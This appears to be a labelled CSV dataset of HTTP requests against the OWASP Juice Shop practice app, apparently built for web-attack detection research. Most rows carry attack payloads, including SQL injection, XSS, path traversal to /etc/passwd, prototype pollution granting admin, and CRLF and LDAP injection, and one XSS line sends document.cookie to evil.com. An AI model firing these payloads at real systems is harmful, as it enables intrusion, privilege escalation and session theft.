source_app,label,method,path,body,status_code,response_size
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWGeoQ,,200,96
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWGex7&sid=SbspUjGrg7PI3q_MAAAI,40,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWGeyB&sid=SbspUjGrg7PI3q_MAAAI,,200,32
juiceshop,attack,GET,/socket.io/?EIO=4&transport=websocket&sid=SbspUjGrg7PI3q_MAAAI,,400,45
juiceshop,attack,GET,/assets/file:///etc/passwd,,200,9015
juiceshop,attack,POST,/rest/user/change-password,"{\x22current\x22: \x22oldpassword\x22, \x22new\x22: \x22hacked123\x22, \x22repeat\x22: \x22hacked123\x22}",500,343
juiceshop,attack,PUT,/etc/passwd%2500.jpg,{\x22name\x22: \x22hacked\x22},200,9015
juiceshop,attack,DELETE,/api/BasketItems/1%3B%20DROP%20TABLE%20users%3B--,,401,245
juiceshop,attack,GET,/api/Cards?UserId=32,,401,31
juiceshop,attack,POST,/api/Users,"{\x22email\x22: \x22' UNION SELECT username, password FROM users--\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22' UNION SELECT username, password FROM users--\x22}",201,337
juiceshop,attack,PUT,/api/Addresss/53,"{\x22city\x22: \x22<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>\x22, \x22streetAddress\x22: \x22<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>\x22}",401,31
juiceshop,attack,DELETE,/api/Products/expect%3A//id,,500,341
juiceshop,attack,GET,/rest/products/search?q=value%0D%0AX-Injected%3A%20header,,200,30
juiceshop,attack,POST,/api/Users,"{\x22__proto__\x22: {\x22isAdmin\x22: true}, \x22constructor\x22: {\x22prototype\x22: {\x22isAdmin\x22: true}}}",201,293
juiceshop,attack,PUT,/api/BasketItems/849,{\x22quantity\x22: 0},401,245
juiceshop,attack,DELETE,/api/BasketItems/1%20OR%201%3D1,,401,245
juiceshop,attack,GET,/rest/products/search?q=juice&order=name%3B%20DROP%20TABLE%20users%3B--,,200,2992
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWGez9&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWGl1B&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,POST,/api/Feedbacks,"{\x22comment\x22: \x22<%= 7*7 %>\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,42
juiceshop,attack,PUT,/etc/passwd%2500,{\x22name\x22: \x22hacked\x22},200,9015
juiceshop,attack,DELETE,/api/BasketItems/1%3B%20DROP%20TABLE%20users%3B--,,401,245
juiceshop,attack,GET,/rest/products/search?q=admin%29%28%7C%28password%3D%2A%29%29,,200,30
juiceshop,attack,POST,/api/Users,"{\x22__proto__\x22: {\x22isAdmin\x22: true}, \x22constructor\x22: {\x22prototype\x22: {\x22isAdmin\x22: true}}}",201,293
juiceshop,attack,PUT,/api/Addresss/75,"{\x22city\x22: \x22%3Cscript%3Ealert('XSS')%3C/script%3E\x22, \x22streetAddress\x22: \x22%3Cscript%3Ealert('XSS')%3C/script%3E\x22}",401,31
juiceshop,attack,DELETE,/api/BasketItems/1%20OR%201%3D1,,401,245
juiceshop,attack,GET,/rest/products/search?q=admin%29%28%7C%28password%3D%2A%29%29,,200,30
juiceshop,attack,POST,/api/Feedbacks,"{\x22comment\x22: \x22' UNION SELECT NULL, NULL, NULL--\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,42
juiceshop,attack,PUT,/api/Addresss/95,"{\x22city\x22: \x22<iframe src=javascript:alert('XSS')>\x22, \x22streetAddress\x22: \x22<iframe src=javascript:alert('XSS')>\x22}",401,31
juiceshop,attack,DELETE,/api/Products/1,,401,245
juiceshop,attack,GET,/rest/products/search?q=juice&order=1%2C2%2C3%2C4%2C5--,,200,2992
juiceshop,attack,POST,/api/Addresss,"{\x22fullName\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22, \x22mobileNum\x22: \x221234567890\x22, \x22zipCode\x22: \x2212345\x22, \x22streetAddress\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22, \x22city\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22, \x22state\x22: \x22XS\x22, \x22country\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22}",401,31
juiceshop,attack,PUT,/api/Addresss/63,"{\x22city\x22: \x22<div onmouseover=alert('XSS')>hover me</div>\x22, \x22streetAddress\x22: \x22<div onmouseover=alert('XSS')>hover me</div>\x22}",401,31
juiceshop,attack,DELETE,/api/Products/1,,401,245
juiceshop,attack,GET,/rest/products/search?q=juice&order=name%3B%20DROP%20TABLE%20users%3B--,,200,2992
juiceshop,attack,POST,/rest/user/change-password,"{\x22current\x22: \x22oldpassword\x22, \x22new\x22: \x22hacked123\x22, \x22repeat\x22: \x22hacked123\x22}",500,343
juiceshop,attack,PUT,/api/BasketItems/83,{\x22quantity\x22: \x22admin'--\x22},401,245
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWGl1H&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWGr7f&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,DELETE,/api/Users/919,,401,245
juiceshop,attack,GET,/rest/products/search?q=value%0D%0A%0D%0A%3Chtml%3Einjected%3C/html%3E,,200,30
juiceshop,attack,POST,/api/Feedbacks,"{\x22comment\x22: \x22<audio src=x onerror=alert('XSS')>\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,42
juiceshop,attack,PUT,/api/Products/..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,400,157
juiceshop,attack,DELETE,/api/Users/420,,401,245
juiceshop,attack,GET,/rest/products/search?q=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A,,200,30
juiceshop,attack,POST,/api/Feedbacks,"{\x22comment\x22: \x22<<script>alert('XSS');//<</script>\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,42
juiceshop,attack,PUT,/api/BasketItems/57,{\x22quantity\x22: \x221' AND SLEEP(5) AND '1'='1\x22},401,245
juiceshop,attack,DELETE,/api/Cards/997,,401,31
juiceshop,attack,GET,/rest/products/search?q=value%0ASet-Cookie%3A%20malicious%3Dcookie,,200,30
juiceshop,attack,POST,/api/Users,"{\x22__proto__\x22: {\x22isAdmin\x22: true}, \x22constructor\x22: {\x22prototype\x22: {\x22isAdmin\x22: true}}}",201,293
juiceshop,attack,PUT,/api/BasketItems/17,{\x22quantity\x22: \x22admin'-- \x22},401,245
juiceshop,attack,DELETE,/api/Users/1,,401,245
juiceshop,attack,GET,/api/Challenges,,200,8656
juiceshop,attack,POST,/api/Complaints,"{\x22message\x22: \x22data:text/html,<script>alert('XSS')</script>\x22}",401,245
juiceshop,attack,PUT,/api/BasketItems/276,{\x22quantity\x22: 0},401,245
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWGr7h&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWGxDu&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,DELETE,/api/Challenges/1,,401,245
juiceshop,attack,GET,/api/Recycles/338,,200,30
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWGxDv&sid=SbspUjGrg7PI3q_MAAAI,,200,251
juiceshop,attack,POST,/api/Users,"{\x22email\x22: \x22attacker1070@evil.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22totpSecret\x22: \x22\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22test\x22}",201,314
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWGySB&sid=SbspUjGrg7PI3q_MAAAI,"42[\x22notification received\x22,\x22adf858a9828123061257cba29e3f34da87b23962\x22]",200,2
juiceshop,attack,GET,/rest/continue-code,,200,79
juiceshop,attack,PUT,/api/BasketItems/55,{\x22quantity\x22: \x22'; WAITFOR DELAY '0:0:5'--\x22},401,245
juiceshop,attack,DELETE,/api/Products/..%25255c..%25255c..%25255cwindows/win.ini,,500,359
juiceshop,attack,GET,/rest/products/download/..%5C..%5C..%5C..%5Cboot.ini,,400,157
juiceshop,attack,POST,/api/Complaints,{\x22message\x22: \x22'\x5C\x22--></style></script><script>alert('XSS')</script>\x22},401,245
juiceshop,attack,PUT,/api/Products/..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd,{\x22name\x22: \x22hacked\x22},500,358
juiceshop,attack,DELETE,/api/Cards/227,,401,31
juiceshop,attack,GET,/assets/..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,400,157
